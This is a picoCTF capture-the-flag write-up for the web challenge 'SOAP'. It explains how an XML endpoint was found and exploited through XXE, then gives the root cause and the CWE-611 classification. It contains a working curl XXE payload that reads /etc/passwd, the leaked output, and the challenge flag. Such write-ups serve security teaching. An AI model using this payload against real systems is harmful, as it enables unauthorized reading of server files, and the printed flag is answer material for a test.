# SOAP

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}`

## Summary

A Flask endpoint parses attacker-supplied XML with no external entity restrictions, giving
classic XXE (XML External Entity injection). The frontend's own bundled JavaScript reveals the
exact wire format the server expects, and swapping a legitimate value for an external entity
reference reads arbitrary local files, including `/etc/passwd`, which has the flag planted
directly inside it as a fake user entry.

## Discovery

The "Details" button on the homepage triggers a form submit handled entirely in JavaScript
rather than a plain HTML POST. Two static JS files reveal the mechanism:

```javascript
// xmlDetailsCheckPayload.js
window.contentType = 'application/xml';
function payload(data) {
    var xml = '<?xml version="1.0" encoding="UTF-8"?><data>';
    for (var pair of data.entries()) {
        xml += '<' + pair[0] + '>' + pair[1] + '</' + pair[0] + '>';
    }
    return xml + '</data>';
}
```

```javascript
// detailsCheck.js
fetch(path, { method, headers: { 'Content-Type': window.contentType }, body: payload(data) })
```

So `/data` actually expects `Content-Type: application/xml` with a body shaped like
`<data><ID>1</ID></data>`, not a normal form submission. Confirming the endpoint works with that
exact shape:

```
curl -X POST http://TARGET/data -H "Content-Type: application/xml" \
  --data '<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>'
```

returns the expected detail text for that record, confirming the server parses this XML with an
ordinary XML parser (not some other structured format).

## Proof of Concept

```
curl -s -X POST http://TARGET/data \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><ID>&xxe;</ID></data>'
```

The server's XML parser resolves the external entity and substitutes the full file contents into
the `ID` value before the application logic ever runs its own lookup, which then fails ("Invalid
ID") but still echoes the resolved value back in its error message, including the flag planted
inside a fake `picoctf` user line:

```
Invalid ID: root:x:0:0:root:/root:/bin/bash
...
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}
```

## Root Cause

The XML parser processes `<!DOCTYPE>` declarations and external entity references by default
instead of having DTD processing and external entity resolution disabled. Any user-controlled
XML input parsed this way can be used to read arbitrary local files (and, depending on the
runtime, can extend to SSRF or denial of service via entity expansion), regardless of what the
application logic intends to do with the parsed value afterward.

## CWE / OWASP

- **CWE-611**: Improper Restriction of XML External Entity Reference
- **OWASP A05:2021**: Security Misconfiguration
